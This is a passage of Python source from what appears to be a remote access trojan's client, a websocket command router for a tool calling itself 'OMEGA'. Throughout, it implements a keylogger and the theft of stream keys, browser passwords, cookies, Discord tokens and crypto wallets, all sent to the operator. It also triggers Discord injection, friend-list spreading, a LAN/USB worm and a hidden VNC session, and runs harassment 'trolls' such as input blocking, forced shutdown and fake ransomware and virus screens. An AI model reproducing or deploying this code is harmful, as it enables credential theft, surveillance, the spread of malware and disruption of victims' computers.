    try: ctypes.windll.user32.MessageBoxW(0, text, "System Notification", 0x40 | 0x1)
    except: pass

def _get_stream_keys():
    keys = {"obs": None, "slobs": None}
    try:
        obs_path = os.path.expanduser("~\\AppData\\Roaming\\obs-studio\\basic\\profiles")
        if os.path.exists(obs_path):
            for root, dirs, files in os.walk(obs_path):
                for f in files:
                    if f.endswith(".json"):
                        with open(os.path.join(root, f), "r", encoding="utf-8") as file:
                            data = json.load(file)
                            if "settings" in data and "key" in data["settings"]:
                                keys["obs"] = data["settings"]["key"]
        slobs = os.path.expanduser("~\\AppData\\Roaming\\slobs-client\\settings\\service.json")
        if os.path.exists(slobs):
            keys["slobs"] = json.load(open(slobs)).get("key")
    except: pass
    return keys

async def _play_video(url):
    try:
        fd, path = tempfile.mkstemp(suffix=".mp4")
        os.close(fd)
        urllib.request.urlretrieve(url, path)
        os.startfile(path)
    except: pass

async def _loop_sound(url):
    try:
        import pygame
        fd, path = tempfile.mkstemp(suffix=".mp3")
        os.close(fd)
        urllib.request.urlretrieve(url, path)
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        pygame.mixer.music.play(-1)
        while getattr(st, "loopsound_active", False):
            await asyncio.sleep(1)
        pygame.mixer.music.stop()
        os.remove(path)
    except: pass

# ─────────────────────────────────────────────────────────────────────────────
# VOLUME
# ─────────────────────────────────────────────────────────────────────────────
def _set_volume(level):
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from comtypes import CLSCTX_ALL
        from ctypes import cast, POINTER
        import comtypes
        devices = AudioUtilities.GetSpeakers()
        iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        vol     = cast(iface, POINTER(IAudioEndpointVolume))
        vol.SetMasterVolumeLevelScalar(max(0, min(100, level)) / 100, None)
    except: pass

# ─────────────────────────────────────────────────────────────────────────────
# MNK BLOCK (non-blocking — uses daemon threads)
# ─────────────────────────────────────────────────────────────────────────────
def _mnk_mouse(block: bool):
    try:
        import pynput.mouse as pm
        if block:
            if not hasattr(st, "_mouse_l") or st._mouse_l is None:
                st._mouse_l = pm.Listener(suppress=True)
                st._mouse_l.daemon = True
                st._mouse_l.start()
        else:
            if hasattr(st, "_mouse_l") and st._mouse_l:
                try: st._mouse_l.stop()
                except: pass
                st._mouse_l = None
    except: pass

def _mnk_key(block: bool):
    try:
        import pynput.keyboard as pk
        if block:
            if not hasattr(st, "_keyboard_l") or st._keyboard_l is None:
                st._keyboard_l = pk.Listener(suppress=True)
                st._keyboard_l.daemon = True
                st._keyboard_l.start()
        else:
            if hasattr(st, "_keyboard_l") and st._keyboard_l:
                try: st._keyboard_l.stop()
                except: pass
                st._keyboard_l = None
    except: pass

# ─────────────────────────────────────────────────────────────────────────────
# KEYLOGGER
# ─────────────────────────────────────────────────────────────────────────────
def _keylog_start():
    def on_press(key):
        if not st.keylog_active: return False
        try: st.keylog_data.append(key.char or "")
        except: st.keylog_data.append(f"[{key}]")
    try:
        import pynput.keyboard as pk
        pk.Listener(on_press=on_press).start()
    except: pass

# ─────────────────────────────────────────────────────────────────────────────
# TASK MANAGER — full process list with CPU + RAM
# ─────────────────────────────────────────────────────────────────────────────
def _get_process_list():
    try:
        import psutil
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status']):
            try:
                mi = p.info.get('memory_info')
                procs.append({
                    "pid":    p.info['pid'],
                    "name":   p.info['name'] or "",
                    "cpu":    round(p.info.get('cpu_percent', 0) or 0, 1),
                    "mem":    round((mi.rss if mi else 0) / (1024*1024), 1),
                    "status": p.info.get('status', '')
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied): pass
        return sorted(procs, key=lambda x: x['mem'], reverse=True)
    except Exception as e:
        log(f"[TASKS] get_process_list error: {e}")
        return []

def _kill_process(pid: int):
    try:
        import psutil
        psutil.Process(pid).terminate()
        return True
    except Exception as e:
        log(f"[TASKS] kill {pid} error: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# COMMAND ROUTER
# ─────────────────────────────────────────────────────────────────────────────
async def handle(msg, ws):
    # Accept both "t" and "type" fields — fixes portal command miss bug
    t = msg.get("t") or msg.get("type", "")

    # ── Streaming ─────────────────────────────────────────────────────────────
    if t == "ss_start":
        st.streaming = True
        log("[STREAM] Infinite Uplink Active.")
        await send(ws, {"t": "log", "msg": "Screen Stream Started."})
    elif t == "ss_stop":
        st.streaming = False
        log("[STREAM] Uplink Terminated.")
        await send(ws, {"t": "log", "msg": "Screen Stream Stopped."})
    elif t == "set_quality":
        st.quality = int(msg.get("v", 70))
    elif t == "set_monitor":
        idx = int(msg.get("v", 0))
        st.monitor_idx = idx
        if capture_engine is not None:
            try: capture_engine.set_monitor(idx)
            except: pass
        log(f"[STREAM] Monitor switched to #{idx}")
        await send(ws, {"t": "monitor_ack", "idx": idx})
    elif t == "set_grid":
        st.grid_mode = bool(msg.get("v", False))
        log(f"[STREAM] Grid mode: {st.grid_mode}")
    elif t == "audio_start": st.audio_active = True
    elif t == "audio_stop":  st.audio_active = False

    # ── WebRTC Signaling ──────────────────────────────────────────────────────
    elif t == "rtc_offer":
        if _rtc is not None:
            st.streaming = True
            try: await _rtc.handle_offer(msg["sdp"], msg["type"])
            except Exception as e: log(f"[RTC] offer error: {e}")
    elif t == "rtc_ice":
        if _rtc is not None:
            try: _rtc.add_ice_candidate(msg)
            except: pass

    elif t == "rtc_toggle":
        act = msg.get("action")
        val = msg.get("value")
        if act == "monitor":
            idx = int(val)
            st.monitor_idx = idx
            if capture_engine is not None:
                try: capture_engine.set_monitor(idx)
                except: pass
            try: await send(ws, {"t": "monitors", "data": capture_engine.get_monitors()})
            except: pass
        elif act == "style":
            if capture_engine is not None:
                try: capture_engine.set_style(str(val))
                except: pass
        elif act == "camera": st.camera_active = bool(val)
        elif act == "mic":    st.audio_active = bool(val)
        elif act == "audio":  st.audio_active = bool(val)

    # ── Screenshot ────────────────────────────────────────────────────────────
    elif t == "screenshot":
        data = await asyncio.to_thread(_screenshot)
        if data: await send_bin(ws, 0x03, data)
        await send(ws, {"t": "screenshot_done"})

    # ── Task Manager ──────────────────────────────────────────────────────────
    elif t == "get_procs":
        procs = await asyncio.to_thread(_get_process_list)
        await send(ws, {"t": "process_list", "data": procs})

    elif t == "kill_proc":
        pid = int(msg.get("pid", 0))
        ok = await asyncio.to_thread(_kill_process, pid)
        await send(ws, {"t": "info", "msg": f"Process {pid} {'terminated' if ok else 'kill failed'}"})
        # Refresh process list after kill
        await asyncio.sleep(0.3)
        procs = await asyncio.to_thread(_get_process_list)
        await send(ws, {"t": "process_list", "data": procs})

    # ── Wallpaper (URL) ───────────────────────────────────────────────────────
    elif t == "wallpaper":
        url = msg.get("url", "")
        if url:
            import urllib.request
            data = await asyncio.to_thread(lambda: urllib.request.urlopen(url, timeout=10).read())
            ok   = await asyncio.to_thread(_set_wallpaper, data)
            await send(ws, {"t": "info", "msg": "Wallpaper set!" if ok else "Wallpaper failed"})

    elif t == "wallpaper_upload":
        b64 = msg.get("data", "")
        if b64:
            data = base64.b64decode(b64)
            ok   = await asyncio.to_thread(_set_wallpaper, data)
            await send(ws, {"t": "info", "msg": "Wallpaper set from upload!" if ok else "Failed"})

    # ── Keylogger ─────────────────────────────────────────────────────────────
    elif t == "keylog_start":
        st.keylog_active = True; st.keylog_data = []
        threading.Thread(target=_keylog_start, daemon=True).start()
        await send(ws, {"t": "info", "msg": "Keylogger started"})
    elif t == "keylog_stop":
        st.keylog_active = False
        await send(ws, {"t": "info", "msg": "Keylogger stopped"})
    elif t == "keylog_dump":
        data = "".join(st.keylog_data)
        await send(ws, {"t": "info", "msg": f"KEYLOG: {data}"})
        st.keylog_data = []

    # ── Omega Harvest ─────────────────────────────────────────────────────────
    elif t == "harvest":
        def _do_harvest(ws_obj):
            try:
                mod_run = stealer_omega.run_omega_harvest if stealer_omega is not None else None
                if mod_run is None:
                    try:
                        from modules.stealer import run_omega_harvest as mod_run
                    except:
                        asyncio.run_coroutine_threadsafe(
                            send(ws_obj, {"t": "info", "msg": "[ERROR] No stealer module"}), global_loop)
                        return
                def relay_log(m):
                    asyncio.run_coroutine_threadsafe(
                        send(ws_obj, {"t": "info", "msg": m}), global_loop)
                zip_data = mod_run(log_func=relay_log)
                if zip_data:
                    asyncio.run_coroutine_threadsafe(
                        send_bin(ws_obj, 0x06, zip_data), global_loop)
                    relay_log("[SUCCESS] Harvest complete.")
                else:
                    relay_log("[ERROR] Harvest failed.")
            except Exception as e:
                asyncio.run_coroutine_threadsafe(
                    send(ws_obj, {"t": "info", "msg": f"[ERROR] {e}"}), global_loop)
        threading.Thread(target=_do_harvest, args=(ws,), daemon=True).start()

    # ── Elite Commands ────────────────────────────────────────────────────────
    elif t == "killexplorer":
        subprocess.run("taskkill /f /im explorer.exe", shell=True)

    elif t == "listen":
        res = await asyncio.to_thread(_recognize)
        await send(ws, {"t": "info", "msg": f"Heard: {res}"})
    elif t == "video":
        asyncio.create_task(_play_video(msg.get("url", "")))
    elif t == "streamkey":
        keys = await asyncio.to_thread(_get_stream_keys)
        await send(ws, {"t": "info", "msg": f"OBS: {keys['obs']} | SLOBS: {keys['slobs']}"})

    elif t == "grab_all":
        try:
            if stealer is not None:
                loot = {"passwords": [], "cookies": []}
                tokens = []
                wallets = []
                try: loot = await asyncio.to_thread(stealer.get_browser_loot)
                except: pass
                try: tokens = await asyncio.to_thread(stealer.get_discord_tokens)
                except: pass
                try: wallets = await asyncio.to_thread(stealer.get_wallet_data)
                except: pass
                await send(ws, {
                    "t": "grab_res",
                    "passwords": loot.get('passwords', []),
                    "cookies": loot.get('cookies', []),
                    "tokens": tokens,
                    "wallets": wallets
                })
            else:
                await send(ws, {"t": "info", "msg": "[GRAB] Stealer module not loaded"})
        except Exception as e:
            await send(ws, {"t": "info", "msg": f"[GRAB] Error: {e}"})

    elif t == "inject":
        if injection is not None:
            await asyncio.to_thread(injection.inject_discord)
        await send(ws, {"t": "log", "msg": "Discord Client Injection Complete."})

    elif t == "spread":
        spread_text = msg.get("m", "Hey check this!")
        if stealer is not None:
            tokens = await asyncio.to_thread(stealer.get_discord_tokens)
            if tokens:
                threading.Thread(target=spreader.spread_discord,
                                 args=(tokens[0], spread_text), daemon=True).start()
                await send(ws, {"t": "log", "msg": "Friend Spreading Triggered."})
            else: await send(ws, {"t": "log", "msg": "No Discord Tokens Found."})
        else: await send(ws, {"t": "log", "msg": "Stealer module not loaded."})

    elif t == "worm":
        if worm is not None:
            threading.Thread(target=worm.lan_spreader, daemon=True).start()
            threading.Thread(target=worm.usb_spreader, daemon=True).start()
        await send(ws, {"t": "log", "msg": "LAN/USB Worm Spreading Started."})

    elif t == "hvnc":
        if hvnc is not None:
            await asyncio.to_thread(hvnc.start_hvnc_session)
        await send(ws, {"t": "log", "msg": "Hidden Desktop (HVNC) Session Active."})

    elif t == "web_inject":
        if web_injector is not None:
            threading.Thread(target=web_injector.monitor_browser_titles, daemon=True).start()
        await send(ws, {"t": "log", "msg": "Web Injection / Watchdog Started."})

    elif t == "troll":
        act = msg.get("action", "")
        val = msg.get("value", "")

        if act == "msg":
            threading.Thread(target=_msgbox, args=(val,), daemon=True).start()
            await send(ws, {"t": "info", "msg": "Message box launched"})
        elif act == "tts":
            threading.Thread(target=_speak, args=(val,), daemon=True).start()
            await send(ws, {"t": "info", "msg": "TTS launched"})
        elif act == "fakeransom":
            import urllib.request
            try:
                data = await asyncio.to_thread(
                    lambda: urllib.request.urlopen(RANSOM_WALLPAPER_URL).read())
                await asyncio.to_thread(_set_wallpaper, data)
                await asyncio.to_thread(minimize_all_windows)
                await send(ws, {"t": "info", "msg": "Fake ransomware deployed"})
            except: pass
        elif act == "jumpscare":
            try:
                from modules.fun import js_manager
                img_url = msg.get("image", "https://raw.githubusercontent.com/yunginnocence/Jumpscare/main/jeff.jpg")
                snd_url = msg.get("sound", "https://raw.githubusercontent.com/yunginnocence/Jumpscare/main/scream.mp3")
                js_manager.start(img_url, snd_url)
                await send(ws, {"t": "info", "msg": "Jumpscare triggered"})
            except Exception as e:
                await send(ws, {"t": "info", "msg": f"Jumpscare error: {e}"})
        elif act == "stop_js":
            try:
                from modules.fun import js_manager
                js_manager.stop()
                await send(ws, {"t": "info", "msg": "Jumpscare terminated"})
            except: pass
        elif act == "bsod":
            try:
                from modules.fun import trigger_bsod
                trigger_bsod()
            except: pass
        elif act == "lock_mnk":
            threading.Thread(target=_mnk_mouse, args=(True,), daemon=True).start()
            threading.Thread(target=_mnk_key, args=(True,), daemon=True).start()
            await send(ws, {"t": "info", "msg": "Input Blocked"})
        elif act == "unlock_mnk":
            threading.Thread(target=_mnk_mouse, args=(False,), daemon=True).start()
            threading.Thread(target=_mnk_key, args=(False,), daemon=True).start()
            await send(ws, {"t": "info", "msg": "Input Unblocked"})
        elif act == "cursorlock":
            st.cursor_locked = True
            def _lock_cursor():
                _u32 = ctypes.windll.user32
                sw = _u32.GetSystemMetrics(0)
                sh = _u32.GetSystemMetrics(1)
                cx, cy = sw // 2, sh // 2
                while st.cursor_locked:
                    try: _u32.SetCursorPos(cx, cy)
                    except: pass
                    time.sleep(0.016)
            threading.Thread(target=_lock_cursor, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Cursor Locked"})
        elif act == "cursorunlock":
            st.cursor_locked = False
            await send(ws, {"t": "info", "msg": "Cursor Unlocked"})
        elif act == "minimizeall":
            await asyncio.to_thread(minimize_all_windows)
            await send(ws, {"t": "info", "msg": "Windows Minimized"})
        elif act == "shutdown":
            subprocess.Popen(["shutdown", "/p", "/f"],
                             creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "System going down..."})
        elif act == "chaos_mouse":
            st.mouse_chaos = True
            threading.Thread(target=_chaos_mouse_loop, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Chaos mouse active"})
        elif act == "stop_chaos":
            st.mouse_chaos = False
            await send(ws, {"t": "info", "msg": "Chaos mouse stopped"})
        elif act == "flip_screen":
            if recon is not None:
                res = await asyncio.to_thread(recon.flip_screen, int(val or 0))
                await send(ws, {"t": "info", "msg": res})
        elif act == "eject_cd":
            if recon is not None:
                res = await asyncio.to_thread(recon.eject_cd)
                await send(ws, {"t": "info", "msg": res})
        elif act == "set_volume":
            level = int(msg.get("value", 50))
            if recon is not None:
                res = await asyncio.to_thread(recon.set_volume, level)
            else:
                await asyncio.to_thread(_set_volume, level)
                res = f"Volume: {level}%"
            await send(ws, {"t": "info", "msg": res})
        elif act == "get_volume":
            vol = 50
            if recon is not None:
                vol = await asyncio.to_thread(recon.get_volume)
            await send(ws, {"t": "volume", "level": vol})
        elif act == "chat_popup":
            msg_text = msg.get("value", "Hello")
            threading.Thread(
                target=lambda t=msg_text: ctypes.windll.user32.MessageBoxW(
                    0, t, "OMEGA Message", 0x40), daemon=True).start()
        elif act == "printer_spam":
            if recon is not None:
                res = await asyncio.to_thread(recon.printer_spam, str(val))
                await send(ws, {"t": "info", "msg": res})
        elif act == "fake_update":
            subprocess.Popen(
                ["powershell", "-Command",
                 'Start-Process mshta.exe -ArgumentList "about:<html><body bgcolor=black><center style=margin-top:30vh><h1 style=color:white;font-family:Segoe UI;font-size:3em>Windows Update</h1><h3 style=color:#aaa>Updating your PC... Do not turn off your computer</h3></center></body></html>" -WindowStyle Maximized'],
                creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Fake update screen launched"})
        elif act == "kill_explorer":
            await asyncio.to_thread(subprocess.run, "taskkill /f /im explorer.exe",
                                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Explorer killed"})
        elif act == "start_explorer":
            subprocess.Popen("explorer.exe", shell=True)
            await send(ws, {"t": "info", "msg": "Explorer restarted"})
        elif act == "hide_icons":
            await asyncio.to_thread(subprocess.run,
                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Desktop icons hidden"})
        elif act == "show_icons":
            await asyncio.to_thread(subprocess.run,
                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 0 /f',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Desktop icons restored"})

        # ── NEW v25 TROLL ACTIONS ─────────────────────────────────────────────
        elif act == "hide_taskbar":
            def _hide_tb():
                subprocess.run(r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /t REG_BINARY /d 30000000FEFFFFFF020000003800000000000000C00F00005F060000030000000000000000000000AB000000 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run("taskkill /f /im explorer.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.Popen("explorer.exe")
            threading.Thread(target=_hide_tb, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Taskbar hidden"})

        elif act == "show_taskbar":
            def _show_tb():
                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run("taskkill /f /im explorer.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.Popen("explorer.exe")
            threading.Thread(target=_show_tb, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Taskbar restored"})

        elif act == "invert_screen":
            subprocess.Popen(
                ["powershell", "-Command",
                 '$wshell = New-Object -com "WScript.Shell"; $wshell.SendKeys("%(LEFT)"); '
                 'Add-Type -AssemblyName System.Windows.Forms; '
                 '[System.Windows.Forms.SendKeys]::SendWait("%{LEFT}");'],
                creationflags=subprocess.CREATE_NO_WINDOW)
            # Use Magnifier color inversion shortcut: Win + Ctrl + I
            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)   # Win down
            ctypes.windll.user32.keybd_event(0x11, 0, 0, 0)   # Ctrl down
            ctypes.windll.user32.keybd_event(0x49, 0, 0, 0)   # I down
            ctypes.windll.user32.keybd_event(0x49, 0, 2, 0)
            ctypes.windll.user32.keybd_event(0x11, 0, 2, 0)
            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
            await send(ws, {"t": "info", "msg": "Screen inversion toggled"})

        elif act == "screen_off":
            ctypes.windll.user32.SendMessageW(
                ctypes.windll.user32.GetDesktopWindow(),
                0x0112, 0xF170, 2)  # WM_SYSCOMMAND, SC_MONITORPOWER, off
            await send(ws, {"t": "info", "msg": "Monitor turned off"})

        elif act == "screen_on":
            ctypes.windll.user32.mouse_event(0x0001, 0, 0, 0, 0)
            await send(ws, {"t": "info", "msg": "Monitor woken"})

        elif act == "swap_mouse":
            cur = ctypes.windll.user32.GetSystemMetrics(23)  # SM_SWAPBUTTON
            ctypes.windll.user32.SwapMouseButton(0 if cur else 1)
            await send(ws, {"t": "info", "msg": "Mouse buttons swapped" if not cur else "Mouse buttons restored"})

        elif act == "sticky_keys":
            # Trigger StickyKeys dialog via rapid Shift presses in background
            def _sticky():
                for _ in range(6):
                    ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
                    time.sleep(0.05)
                    ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
                    time.sleep(0.05)
            threading.Thread(target=_sticky, daemon=True).start()
            await send(ws, {"t": "info", "msg": "StickyKeys grief triggered"})

        elif act == "high_contrast":
            threading.Thread(target=lambda: subprocess.run(
                'powershell -Command "Add-Type -TypeDefinition \'public class HC { [System.Runtime.InteropServices.DllImport(\\\"user32\\\")]  public static extern bool SystemParametersInfo(uint uiA, uint uiP, ref HICONTRAST pvP, uint fWinIni); }\'; [HC]::SystemParametersInfo(67,0,[ref](new-object HICONTRAST),3)"',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
            await send(ws, {"t": "info", "msg": "High contrast toggled"})

        elif act == "night_light":
            threading.Thread(target=lambda: subprocess.run(
                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\DefaultAccount\Current\default$windows.data.bluelightreduction.bluelightreductionstate\windows.data.bluelightreduction.bluelightreductionstate" /v Data /t REG_BINARY /d 02000000 /f',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
            await send(ws, {"t": "info", "msg": "Night light forced on"})

        elif act == "clipboard_spam":
            spam_text = msg.get("value", "OMEGA WAS HERE 💀🔥")
            def _cspam():
                for _ in range(100):
                    try:
                        subprocess.run(
                            f'powershell -Command "Set-Clipboard -Value \'{spam_text}\'"',
                            shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
                            timeout=2)
                        time.sleep(0.1)
                    except: break
            threading.Thread(target=_cspam, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Clipboard spam started"})

        elif act == "notification_spam":
            notif_text = msg.get("value", "⚠️ Your computer has a virus!")
            def _nspam():
                for i in range(10):
                    try:
                        subprocess.run(
                            ["powershell", "-Command",
                             f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null;'
                             f'$xml = New-Object Windows.Data.Xml.Dom.XmlDocument;'
                             f'$xml.LoadXml("<toast><visual><binding template=\'ToastText01\'><text id=\'1\'>{notif_text}</text></binding></visual></toast>");'
                             f'$toast = [Windows.UI.Notifications.ToastNotification]::new($xml);'
                             f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Omega").Show($toast);'],
                            creationflags=subprocess.CREATE_NO_WINDOW)
                        time.sleep(1.5)
                    except: break
            threading.Thread(target=_nspam, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Notification spam started"})

        elif act == "fake_virus":
            # Spawn a full-screen fake AV scan window
            html = """<html><body style='background:#000;font-family:Consolas;color:#0f0;padding:40px'>
<h1 style='color:red'>⚠️ CRITICAL VIRUS DETECTED</h1>
<p>Scanning system files...</p>
<pre id='s'></pre>
<script>
let i=0, files=[
'C:\\Windows\\System32\\kernel32.dll',
'C:\\Windows\\System32\\ntdll.dll',
'C:\\Program Files\\Common Files\\services.exe',
'C:\\Users\\Public\\Documents\\startup.exe',
'C:\\Windows\\Temp\\trojan_dropper.bin',
'C:\\ProgramData\\backdoor_connect.dll',
'C:\\Windows\\System32\\svchost.exe (INFECTED)',
];
function tick(){
  document.getElementById('s').textContent += '> SCANNING: '+files[i%files.length]+'...INFECTED\\n';
  i++;
  setTimeout(tick, 200);
}
tick();
</script></body></html>"""
            tmp = tempfile.mktemp(suffix=".html")
            open(tmp, "w", encoding="utf-8").write(html)
            subprocess.Popen(f'mshta.exe "{tmp}"',
                             creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Fake virus scanner launched"})

        elif act == "fake_activation":
            # Fake Windows activation watermark via nircmd / text overlay
            html = """<html><body style='background:transparent;margin:0'>
<div style='position:fixed;bottom:10px;right:10px;color:rgba(255,255,255,0.4);font:14px Segoe UI;user-select:none;pointer-events:none'>
Activate Windows<br>Go to Settings to activate Windows.
</div></body></html>"""
            tmp = tempfile.mktemp(suffix=".html")
            open(tmp, "w").write(html)
            subprocess.Popen(
                ["powershell", "-Command",
                 f'Start-Process mshta.exe -ArgumentList \'{tmp}\' -WindowStyle Normal'],
                creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Fake activation watermark shown"})

        elif act == "open_url":
            url = msg.get("value", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            subprocess.Popen(f'start "" "{url}"', shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": f"URL opened: {url}"})

        elif act == "url_spam":
            url  = msg.get("value", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            cnt  = min(int(msg.get("count", 5)), 20)
            def _urlspam():
                for _ in range(cnt):
                    subprocess.Popen(f'start "" "{url}"', shell=True,
                                     creationflags=subprocess.CREATE_NO_WINDOW)
                    time.sleep(0.5)
            threading.Thread(target=_urlspam, daemon=True).start()
            await send(ws, {"t": "info", "msg": f"Opened {cnt} tabs"})

        elif act == "maximize_all":
            threading.Thread(target=lambda: subprocess.run(
                "powershell -Command \"(New-Object -ComObject Shell.Application).MinimizeAll()\"",
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW), daemon=True).start()
            await send(ws, {"t": "info", "msg": "All windows minimized"})

        elif act == "beep_pattern":
            def _beep():
                patterns = [(800,200),(400,200),(1200,100),(200,500),(1000,300)]
                for freq, dur in patterns:
                    ctypes.windll.kernel32.Beep(freq, dur)
                    time.sleep(0.05)
            threading.Thread(target=_beep, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Beep pattern played"})

        elif act == "audio_max":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                devices = AudioUtilities.GetSpeakers()
                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                vol     = cast(iface, POINTER(IAudioEndpointVolume))
                vol.SetMasterVolumeLevelScalar(1.0, None)
            except: subprocess.run("nircmd.exe setsysvolume 65535", shell=True)
            await send(ws, {"t": "info", "msg": "Volume maxed"})

        elif act == "audio_mute":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                devices = AudioUtilities.GetSpeakers()
                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                vol     = cast(iface, POINTER(IAudioEndpointVolume))
                vol.SetMute(1, None)
            except: pass
            await send(ws, {"t": "info", "msg": "Audio muted"})

        elif act == "audio_unmute":
            try:
                from ctypes import cast, POINTER
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                devices = AudioUtilities.GetSpeakers()
                iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                vol     = cast(iface, POINTER(IAudioEndpointVolume))
                vol.SetMute(0, None)
            except: pass
            await send(ws, {"t": "info", "msg": "Audio unmuted"})

        elif act == "type_loop":
            text = msg.get("value", "OMEGA ELITE 💀 ")
            delay = float(msg.get("delay", 0.05))
            st.type_loop = True
            def _type_loop():
                while getattr(st, "type_loop", False):
                    for ch in text:
                        if not getattr(st, "type_loop", False): break
                        try:
                            vk = ctypes.windll.user32.VkKeyScanW(ord(ch)) & 0xFF
                            if vk:
                                ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                                ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
                        except: pass
                        time.sleep(delay)
            threading.Thread(target=_type_loop, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Type loop started"})
        elif act == "type_loop_stop":
            st.type_loop = False
            await send(ws, {"t": "info", "msg": "Type loop stopped"})

        elif act == "drag_chaos":
            st.drag_chaos = True
            def _drag_chaos_loop():
                import random
                u32 = ctypes.windll.user32
                sw  = u32.GetSystemMetrics(0)
                sh  = u32.GetSystemMetrics(1)
                while getattr(st, "drag_chaos", False):
                    try:
                        tx = random.randint(100, sw-100)
                        ty = random.randint(100, sh-100)
                        u32.SetCursorPos(tx, ty)
                        u32.mouse_event(0x0002, 0, 0, 0, 0)  # left down
                        time.sleep(0.05)
                        u32.SetCursorPos(tx + random.randint(-200, 200),
                                          ty + random.randint(-200, 200))
                        u32.mouse_event(0x0004, 0, 0, 0, 0)  # left up
                    except: pass
                    time.sleep(0.3)
            threading.Thread(target=_drag_chaos_loop, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Drag chaos active"})
        elif act == "drag_chaos_stop":
            st.drag_chaos = False
            await send(ws, {"t": "info", "msg": "Drag chaos stopped"})

        elif act == "screen_flash":
            count = min(int(msg.get("count", 5)), 20)
            def _flash():
                hwnd = ctypes.windll.user32.GetDesktopWindow()
                for _ in range(count):
                    ctypes.windll.user32.FlashWindow(hwnd, True)
                    time.sleep(0.15)
                    ctypes.windll.user32.FlashWindow(hwnd, False)
                    time.sleep(0.15)
            threading.Thread(target=_flash, daemon=True).start()
            await send(ws, {"t": "info", "msg": f"Screen flashed {count}x"})

        elif act == "freeze_screen":
            # Capture current screen and display as a topmost overlay (appears frozen)
            def _freeze():
                try:
                    import mss, PIL.Image, PIL.ImageTk, tkinter as tk
                    with mss.mss() as sct:
                        mon = sct.monitors[0]
                        sshot = sct.grab(mon)
                    img = PIL.Image.frombytes("RGB", sshot.size, sshot.bgra, "raw", "BGRX")
                    root = tk.Tk()
                    root.attributes("-fullscreen", True, "-topmost", True)
                    root.overrideredirect(True)
                    tk_img = PIL.ImageTk.PhotoImage(img)
                    lbl = tk.Label(root, image=tk_img, cursor="arrow")
                    lbl.pack()
                    root.after(int(msg.get("duration", 8)) * 1000, root.destroy)
                    root.mainloop()
                except Exception as e:
                    log(f"[FREEZE] {e}")
            threading.Thread(target=_freeze, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Screen frozen"})

        elif act == "cam_freeze_frame":
            # Show last camera frame as fullscreen frozen overlay
            if hasattr(st, "last_cam_frame") and st.last_cam_frame:
                data = st.last_cam_frame
                def _cam_freeze():
                    try:
                        import io, PIL.Image, PIL.ImageTk, tkinter as tk
                        img  = PIL.Image.open(io.BytesIO(data))
                        root = tk.Tk()
                        root.attributes("-fullscreen", True, "-topmost", True)
                        root.overrideredirect(True)
                        tk_img = PIL.ImageTk.PhotoImage(img)
                        tk.Label(root, image=tk_img).pack()
                        root.after(int(msg.get("duration", 6)) * 1000, root.destroy)
                        root.mainloop()
                    except Exception as e:
